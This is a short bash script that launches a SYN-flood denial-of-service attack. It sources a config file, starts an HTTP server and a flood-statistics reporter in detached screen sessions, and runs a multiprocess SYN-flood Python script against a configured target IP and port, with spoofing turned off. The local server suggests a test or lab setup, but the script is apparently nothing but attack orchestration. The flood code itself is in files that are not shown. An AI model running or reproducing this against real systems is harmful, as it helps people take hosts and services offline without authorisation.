#!/bin/bash

# ====================================================== #

DIR=$(dirname $0)

source $DIR/config.sh

# ====================================================== #

echo Running HTTP server on port $SERVER_PORT

screen -dmSL server bash $DIR/server.sh $SERVER_PORT
screen -dmSL stats-report python $DIR/syn-flood-stats.py $TARGET_IP $TARGET_PORT

python $DIR/ezSYN_FLOOD_MULTIPROCESS.py "$TARGET_IP" "$TARGET_PORT" --workers="$NUM_WORKERS" --sleep="$SLEEP_TIME" --no-spoof


